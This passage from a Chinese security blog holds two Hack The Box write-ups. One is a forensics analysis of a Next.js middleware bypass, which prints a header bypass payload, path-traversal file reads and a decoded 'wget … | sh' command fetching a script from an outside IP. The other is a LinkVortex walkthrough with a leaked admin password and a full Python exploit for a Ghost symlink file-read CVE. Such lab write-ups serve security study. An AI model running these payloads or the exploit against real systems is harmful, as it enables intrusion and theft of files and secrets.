href="https://github.com/vercel/next.js/blob/v15.1.0/packages/next/src/server/web/sandbox/sandbox.ts">Next.js v15.1.0 的源码</a> 中有漏洞的地方</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">const</span> runtime = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getRuntimeContext</span>(params)<br><span class="hljs-keyword">const</span> subreq = params.<span class="hljs-property">request</span>.<span class="hljs-property">headers</span>[<span class="hljs-string">`x-middleware-subrequest`</span>]<br><span class="hljs-keyword">const</span> subrequests = <span class="hljs-keyword">typeof</span> subreq === <span class="hljs-string">&#x27;string&#x27;</span> ? subreq.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;:&#x27;</span>) : []<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">MAX_RECURSION_DEPTH</span> = <span class="hljs-number">5</span><br><span class="hljs-keyword">const</span> depth = subrequests.<span class="hljs-title function_">reduce</span>(<br>  <span class="hljs-function">(<span class="hljs-params">acc, curr</span>) =&gt;</span> (curr === params.<span class="hljs-property">name</span> ? acc + <span class="hljs-number">1</span> : acc),<br>  <span class="hljs-number">0</span><br>)<br><br><span class="hljs-keyword">if</span> (depth &gt;= <span class="hljs-variable constant_">MAX_RECURSION_DEPTH</span>) &#123;<br>  <span class="hljs-keyword">return</span> &#123;<br>    <span class="hljs-attr">waitUntil</span>: <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(),<br>    <span class="hljs-attr">response</span>: <span class="hljs-keyword">new</span> runtime.<span class="hljs-property">context</span>.<span class="hljs-title class_">Response</span>(<span class="hljs-literal">null</span>, &#123;<br>      <span class="hljs-attr">headers</span>: &#123;<br>        <span class="hljs-string">&#x27;x-middleware-next&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>,<br>      &#125;,<br>    &#125;),<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>当 <code>x-middleware-subrequest</code> 的值以 <code>:</code> 分割一次并且值为 <code>params.name</code> 也就是中间件的路径时，<code>depth</code> 就 +1，如果 <code>depth</code> 大于等于 <code>MAX_RECURSION_DEPTH</code> 的值也就是 5 时，返回空响应并设置 <code>x-middleware-next</code> 的值为 1，这样能防止无限递归造成请求超时等</p><p><img src="https://img.dkdun.cn/v1/2025/12/57485405d8688827.png"></p><p>所以让 <code>depth &gt;= 5</code> 就能绕过中间件的鉴定</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-attribute">x-middleware-subrequest</span>: <span class="hljs-attribute">middleware</span>:<span class="hljs-attribute">middleware</span>:<span class="hljs-attribute">middleware</span>:<span class="hljs-attribute">middleware</span>:middleware<br></code></pre></td></tr></table></figure><p>所以为</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">x-middleware-subrequest</span><span class="hljs-punctuation">: </span>middleware:middleware:middleware:middleware:middleware<br></code></pre></td></tr></table></figure><h1 id="将该漏洞与-SSRF-攻击串联起来，因此能够执行内部端口扫描并发现内部-API。该-API-可以通过哪个端口访问"><a href="#将该漏洞与-SSRF-攻击串联起来，因此能够执行内部端口扫描并发现内部-API。该-API-可以通过哪个端口访问" class="headerlink" title="将该漏洞与 SSRF 攻击串联起来，因此能够执行内部端口扫描并发现内部 API。该 API 可以通过哪个端口访问"></a>将该漏洞与 SSRF 攻击串联起来，因此能够执行内部端口扫描并发现内部 API。该 API 可以通过哪个端口访问</h1><p>查看 <code>data-api.log</code> 文件的记录，根据攻击成功的时间段来看可以发现对 4000 端口进行了访问</p><p><img src="https://img.dkdun.cn/v1/2025/12/6560a49952a3c10c.png"></p><h1 id="在-API-中寻找易受攻击的-endpoint"><a href="#在-API-中寻找易受攻击的-endpoint" class="headerlink" title="在 API 中寻找易受攻击的 endpoint"></a>在 API 中寻找易受攻击的 endpoint</h1><p>可以发现对 <code>/logs</code> 请求后还进行了一些其他行为， <code>/logs?logFile=/var/log/../.../...//../.../...//etc/passwd</code> 和 <code>/logs?logFile=/var/log/../.../...//../.../...//proc/self/environ</code> ，遍历路径读取 <code>/etc/passwd</code> 和 <code>/proc/self/environ</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/4d6e0153ded31eaf.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/logs<br></code></pre></td></tr></table></figure><h1 id="endpoint-首次被使用的时间"><a href="#endpoint-首次被使用的时间" class="headerlink" title="endpoint 首次被使用的时间"></a>endpoint 首次被使用的时间</h1><p>读取 <code>/etc/passwd</code> 的时间</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2025</span>-<span class="hljs-number">04</span>-<span class="hljs-number">01</span> <span class="hljs-number">11</span>:<span class="hljs-number">39</span>:<span class="hljs-number">01</span><br></code></pre></td></tr></table></figure><h1 id="endpoint-被利用的漏洞名称"><a href="#endpoint-被利用的漏洞名称" class="headerlink" title="endpoint 被利用的漏洞名称"></a>endpoint 被利用的漏洞名称</h1><p>从  <code>/logs?logFile=/var/log/../.../...//../.../...//etc/passwd</code> 和 <code>/logs?logFile=/var/log/../.../...//../.../...//proc/self/environ</code>  可以知道通过构造特定的文件路径，读取这些敏感文件，这种攻击方法符合利用 LFI 漏洞，也就是本地文件包含漏洞（Local File Inclusion）</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq"><span class="hljs-keyword">Local</span> <span class="hljs-keyword">File</span> Inclusion<br></code></pre></td></tr></table></figure><h1 id="读取的文件"><a href="#读取的文件" class="headerlink" title="读取的文件"></a>读取的文件</h1><p><code>/tmp</code> 下的 <code>secret.key</code> 文件</p><p><img src="https://img.dkdun.cn/v1/2025/12/844cabc6bfcb50de.png"></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lsl">secret.<span class="hljs-type">key</span><br></code></pre></td></tr></table></figure><h1 id="查找允许执行-Redis-注入并获得-RCE的特殊命令"><a href="#查找允许执行-Redis-注入并获得-RCE的特殊命令" class="headerlink" title="查找允许执行 Redis 注入并获得 RCE的特殊命令"></a>查找允许执行 Redis 注入并获得 RCE的特殊命令</h1><p>查看 <code>redis.log</code> 文件找到命令</p><p><img src="https://img.dkdun.cn/v1/2025/12/004f120f4bbc4c34.png"></p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">OS_EXEC|<span class="hljs-type">d2dldCBodHRwOi8vMTg1LjIwMi4yLjE0Ny9oNFBsbjQvcnVuLnNoIC1PLSB8IHNo</span>|<span class="hljs-type">f1f0c1feadb5abc79e700cac7ac63cccf91e818ecf693ad7073e3a448fa13bbb</span><br></code></pre></td></tr></table></figure><h1 id="解码后的命令"><a href="#解码后的命令" class="headerlink" title="解码后的命令"></a>解码后的命令</h1><p>在 <code>bci-device.log</code> 里面能找到命令的明文</p><p><img src="https://img.dkdun.cn/v1/2025/12/63b90d934f53470b.png"></p><p>也可以 base64 解码 <code>d2dldCBodHRwOi8vMTg1LjIwMi4yLjE0Ny9oNFBsbjQvcnVuLnNoIC1PLSB8IHNo</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget http:<span class="hljs-regexp">//</span><span class="hljs-number">185.202</span>.<span class="hljs-number">2.147</span><span class="hljs-regexp">/h4Pln4/</span>run.sh -O- | sh<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>应急响应&amp;取证</category>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Next.js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-LinkVortex</title>
    <link href="/2025/04/14/HTB-LinkVortex/"/>
    <url>/2025/04/14/HTB-LinkVortex/</url>
    
    <content type="html"><![CDATA[<p>git 泄露，由 symlinks 导致的任意文件读取漏洞</p><span id="more"></span><h1 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h1><h2 id="nmap-端口扫描"><a href="#nmap-端口扫描" class="headerlink" title="nmap 端口扫描"></a>nmap 端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─# nmap -sS -sV -A -Pn 10.10.11.47<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-13 19:34 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.47<br>Host is up (0.36s latency).<br>Not shown: 998 closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey:<br>|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)<br>|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)<br>80/tcp open  http    Apache httpd<br>|_http-title: Did not follow redirect to http://linkvortex.htb/<br>|_http-server-header: Apache<br>No exact OS matches <span class="hljs-keyword">for</span> host (If you know what OS is running on it, see https://nmap.org/submit/ ).<br>TCP/IP fingerprint:<br>OS:SCAN(V=7.94SVN%E=4%D=4/13%OT=22%CT=1%CU=33150%PV=Y%DS=3%DC=T%G=Y%TM=67FB<br>OS:A18A%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10D%TI=Z%CI=Z%TS=A)SEQ(S<br>OS:P=108%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53AST11NW7%O2=M53AST11NW<br>OS:7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST11NW7%O6=M53AST11)WIN(W1=FE88%<br>OS:W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53AN<br>OS:NSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=<br>OS:Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=A<br>OS:R%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=4<br>OS:0%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=<br>OS:G%RIPCK=G%RUCK=F845%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)<br><br>Network Distance: 3 hops<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>TRACEROUTE (using port 554/tcp)<br>HOP RTT       ADDRESS<br>1   0.40 ms   butt3rf1y.mshome.net (172.30.144.1)<br>2   404.35 ms 10.10.16.1<br>3   258.09 ms 10.10.11.47<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 41.82 seconds<br></code></pre></td></tr></table></figure><p>开放了 80 和 22 端口</p><h2 id="访问-80-端口"><a href="#访问-80-端口" class="headerlink" title="访问 80 端口"></a>访问 80 端口</h2><p>80 端口除了得出使用了  <code>Ghost</code>  框架和有一个 <code>admin</code> 用户就没什么有用的信息了</p><p><img src="https://img.dkdun.cn/v1/2025/12/3ea0caa5ce97e31a.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/4fad161c76b6ffe0.png"></p><h2 id="dirsearch-目录扫描"><a href="#dirsearch-目录扫描" class="headerlink" title="dirsearch 目录扫描"></a>dirsearch 目录扫描</h2><p>只有一个 <code>robots.txt</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/ab8813db5b318ff4.png"></p><p>访问 <code>/robots.txt</code> 发现还有几个路由</p><p><img src="https://img.dkdun.cn/v1/2025/12/fde7fd1d3ca5a675.png"></p><p>只有 <code>/ghost</code> 路由才能访问上，得到了一个登录界面，但是没登录邮箱和密码</p><p><img src="https://img.dkdun.cn/v1/2025/12/fba652650ac3af62.png"></p><h2 id="gobuster-子域名扫描"><a href="#gobuster-子域名扫描" class="headerlink" title="gobuster 子域名扫描"></a>gobuster 子域名扫描</h2><p>目前来说没什么有用的信息，所以来对子域名进行枚举</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster vhost -u http://linkvortex.htb -w /usr/share/wordlists/amass/subdomains-top1mil-110000.txt --append-domain<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/cbc5cbfb3323afe8.png"></p><p>有一个 <code>dev.linkvortex.htb</code> 子域名</p><p>访问发现依然没有什么东西</p><p><img src="https://img.dkdun.cn/v1/2025/12/8b4dcdb8e66a3413.png"></p><p>再次对子域名目录进行扫描，发现了 <code>.git</code> 路由</p><p><img src="https://img.dkdun.cn/v1/2025/12/721ebb42f2ac91f6.png"></p><p>访问得到了很多文件，应该有 <code>.git</code> 泄露</p><h1 id="git-泄露"><a href="#git-泄露" class="headerlink" title="git 泄露"></a>git 泄露</h1><p>用 <a href="https://github.com/arthaud/git-dumper/tree/master">git-dumper</a> 把仓库 dump 到本地</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git-dumper http://dev.linkvortex.htb/.git ./<br></code></pre></td></tr></table></figure><p>用 <code>git status</code> 查看仓库的状态</p><p><img src="https://img.dkdun.cn/v1/2025/12/cadfce2f14c13dfc.png"></p><p>查看最近更新的 <code>/ghost/core/test/regression/api/admin</code> 下的 <code>authentication.test.js</code> 文件，在其中发现了一些形如下图的 email 和 password</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title function_">it</span>(<span class="hljs-string">&#x27;complete setup&#x27;</span>, <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">const</span> email = <span class="hljs-string">&#x27;test@example.com&#x27;</span>;<br>        <span class="hljs-keyword">const</span> password = <span class="hljs-string">&#x27;OctopiFociPilfer45&#x27;</span>;<br><br>        <span class="hljs-keyword">const</span> requestMock = <span class="hljs-title function_">nock</span>(<span class="hljs-string">&#x27;https://api.github.com&#x27;</span>)<br>          .<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/repos/tryghost/dawn/zipball&#x27;</span>)<br>          .<span class="hljs-title function_">query</span>(<span class="hljs-literal">true</span>)<br>          .<span class="hljs-title function_">replyWithFile</span>(<span class="hljs-number">200</span>, fixtureManager.<span class="hljs-title function_">getPathForFixture</span>(<span class="hljs-string">&#x27;themes/valid.zip&#x27;</span>));<br></code></pre></td></tr></table></figure><p>去 <code>linkvortex.htb/ghost/#/signin</code> 尝试登录，有很多个 email 和 passwd 都登不进去</p><p>前面在网页中发现有 admin 账户，构造 <code>admin@linkvortex.htb</code> 邮箱，最后用下面的用户名和密码登录进去了</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">admin<span class="hljs-keyword">@linkvortex</span>.<span class="hljs-attribute">htb</span>:OctopiFociPilfer45<br></code></pre></td></tr></table></figure><h2 id="进入后台"><a href="#进入后台" class="headerlink" title="进入后台"></a>进入后台</h2><p>登陆进去后通过 Wappalyzer  可以发现当前 <code>Ghost</code> 的版本是 5.58，找到了相关 CVE：<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-40028">CVE-2023-40028</a>， 5.59.1 之前的版本允许经过身份验证的用户上传符号链接文件（symlinks），导致任意文件读取操作</p><h1 id="根据漏洞写-POC-脚本"><a href="#根据漏洞写-POC-脚本" class="headerlink" title="根据漏洞写 POC 脚本"></a>根据漏洞写 POC 脚本</h1><p>poc for <a href="https://github.com/buutt3rf1y/CVE-2023-40028/">CVE-2023-40028</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> getopt<br><span class="hljs-keyword">from</span> pathlib <span class="hljs-keyword">import</span> Path<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">usage</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Usage: <span class="hljs-subst">&#123;sys.argv[<span class="hljs-number">0</span>]&#125;</span> --url &lt;http://example.com&gt; -u &lt;username&gt; -p &lt;password&gt;&quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_random_name</span>(<span class="hljs-params">length=<span class="hljs-number">13</span></span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(random.choices(string.ascii_letters + string.digits, k=length))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_exploit</span>(<span class="hljs-params">file_to_read, payload_path, image_name</span>):<br>    <span class="hljs-comment"># 创建完整的目录结构</span><br>    image_dir = payload_path / <span class="hljs-string">&quot;content/images/2024&quot;</span><br>    image_dir.mkdir(parents=<span class="hljs-literal">True</span>, exist_ok=<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-comment"># 创建符号链接文件</span><br>    symlinks_path = image_dir / <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;image_name&#125;</span>.png&quot;</span><br><br>    <span class="hljs-comment"># 创建 symlinks</span><br>    os.system(<span class="hljs-string">f&quot;ln -s <span class="hljs-subst">&#123;file_to_read&#125;</span> <span class="hljs-subst">&#123;symlinks_path&#125;</span>&quot;</span>)<br>    <span class="hljs-comment"># 打包 zip</span><br>    os.system(<span class="hljs-string">f&quot;zip -r -y <span class="hljs-subst">&#123;payload_path&#125;</span> ./exp/ &amp;&gt;/dev/null&quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">clean</span>(<span class="hljs-params">payload_path, image_name</span>):<br>    <span class="hljs-comment"># 清理产生的文件</span><br>    os.system(<span class="hljs-string">f&quot;rm -f <span class="hljs-subst">&#123;payload_path&#125;</span>/content/images/2024/<span class="hljs-subst">&#123;image_name&#125;</span>.png&quot;</span>)<br>    os.system(<span class="hljs-string">f&quot;rm -f <span class="hljs-subst">&#123;payload_path&#125;</span>.zip&quot;</span>)<br>    os.system(<span class="hljs-string">f&quot;rm -rf <span class="hljs-subst">&#123;payload_path&#125;</span>&quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">try</span>:<br>        opts, _ = getopt.getopt(sys.argv[<span class="hljs-number">1</span>:], <span class="hljs-string">&quot;u:p:&quot;</span>, [<span class="hljs-string">&quot;url=&quot;</span>])<br>    <span class="hljs-keyword">except</span> getopt.GetoptError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Usage: <span class="hljs-subst">&#123;sys.argv[<span class="hljs-number">0</span>]&#125;</span> --url &lt;http://example.com&gt; -u &lt;username&gt; -p &lt;password&gt;&quot;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-comment"># 从命令行读取参数执行</span><br>    Ghost_Url = username = password = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">for</span> opt, arg <span class="hljs-keyword">in</span> opts:<br>        <span class="hljs-keyword">if</span> opt == <span class="hljs-string">&quot;-u&quot;</span>:<br>            username = arg<br>        <span class="hljs-keyword">elif</span> opt == <span class="hljs-string">&quot;-p&quot;</span>:<br>            password = arg<br>        <span class="hljs-keyword">elif</span> opt == <span class="hljs-string">&quot;--url&quot;</span>:<br>            Ghost_Url = arg.rstrip(<span class="hljs-string">&quot;/&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (Ghost_Url <span class="hljs-keyword">and</span> username <span class="hljs-keyword">and</span> password):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Necessary parameters are missing,maybe url or username or password...&quot;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br>    Ghost_API = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;Ghost_Url&#125;</span>/ghost/api/v3/admin/&#x27;</span><br>    payload_path = Path(__file__).parent / <span class="hljs-string">&quot;exp&quot;</span><br>    payload_path.mkdir(exist_ok=<span class="hljs-literal">True</span>, parents=<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-comment"># curl 创建会话并保存 cookie</span><br>    os.system(<br>        <span class="hljs-string">f&quot;curl -c cookie.txt -d username=<span class="hljs-subst">&#123;username&#125;</span> -d password=<span class="hljs-subst">&#123;password&#125;</span> -H \&quot;Origin: <span class="hljs-subst">&#123;Ghost_Url&#125;</span>\&quot; -H \&quot;Accept-Version: v3.0\&quot; <span class="hljs-subst">&#123;Ghost_API&#125;</span>session/ &gt; /dev/null 2&gt;&amp;1&quot;</span>)<br><br>    <span class="hljs-comment"># 检测 cookie 是否有效</span><br>    <span class="hljs-keyword">if</span> os.system(<span class="hljs-string">&quot;grep -q ghost-admin-api-session cookie.txt&quot;</span>) != <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Invalid username or password&quot;</span>)<br>        os.system(<span class="hljs-string">f&quot;rm -f cookie.txt&quot;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        file_to_read = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;file&gt; &quot;</span>).strip()<br>        <span class="hljs-keyword">if</span> file_to_read.lower() == <span class="hljs-string">&quot;exit&quot;</span>:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot; &quot;</span> <span class="hljs-keyword">in</span> file_to_read <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> file_to_read:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;please enter a valid file path:&quot;</span>)<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> file_to_read:<br>            <span class="hljs-keyword">continue</span><br><br>        <span class="hljs-comment"># 生成 payload</span><br>        image_name = generate_random_name()<br>        generate_exploit(file_to_read, payload_path, image_name)<br><br>        <span class="hljs-comment"># 上传 zip</span><br>        upload_path = os.popen(<br>            <span class="hljs-string">f&#x27;curl -s -b cookie.txt &#x27;</span><br>            <span class="hljs-string">f&#x27;-H &quot;X-Ghost-Version: 5.58&quot; &#x27;</span><br>            <span class="hljs-string">f&#x27;-H &quot;Referer: <span class="hljs-subst">&#123;Ghost_Url&#125;</span>/ghost/&quot; &#x27;</span><br>            <span class="hljs-string">f&#x27;-H &quot;Origin: <span class="hljs-subst">&#123;Ghost_Url&#125;</span>&quot; &#x27;</span><br>            <span class="hljs-string">f&#x27;-F &quot;importfile=@./exp.zip;type=application/zip&quot; &#x27;</span><br>            <span class="hljs-string">f&#x27;&quot;<span class="hljs-subst">&#123;Ghost_Url&#125;</span>/ghost/api/v3/admin/db&quot;&#x27;</span><br>        ).read()<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;error&quot;</span> <span class="hljs-keyword">in</span> upload_path.lower():<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;upload failed: <span class="hljs-subst">&#123;upload_path&#125;</span>!!!&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;upload successful!!!&quot;</span>)<br>            <br>        <span class="hljs-comment"># 读取目标文件</span><br>        file_url = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;Ghost_Url&#125;</span>/content/images/2024/<span class="hljs-subst">&#123;image_name&#125;</span>.png&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;requesting <span class="hljs-subst">&#123;file_url&#125;</span>&quot;</span>)<br>        response = os.popen(<span class="hljs-string">f&quot;curl -b cookie.txt -s <span class="hljs-subst">&#123;file_url&#125;</span>&quot;</span>).read()<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Not Found&quot;</span> <span class="hljs-keyword">in</span> response:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;file <span class="hljs-subst">&#123;file_url&#125;</span> not found&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Received!&quot;</span>)<br>            <span class="hljs-built_in">print</span>(response)<br><br>        clean(payload_path, image_name)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 exp.py --url http://linkvortex.htb/ -u admin@linkvortex.htb -p OctopiFociPilfer45<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/db9cabf1ef5d1047.png"></p><p>能够成功读取 <code>/etc/passwd</code> 下的文件，但是其中并没有什么有用的用户</p><p>当访问 dump 下来仓库中的 <code>Dockerfile.ghost</code> 文件时发现</p><p><img 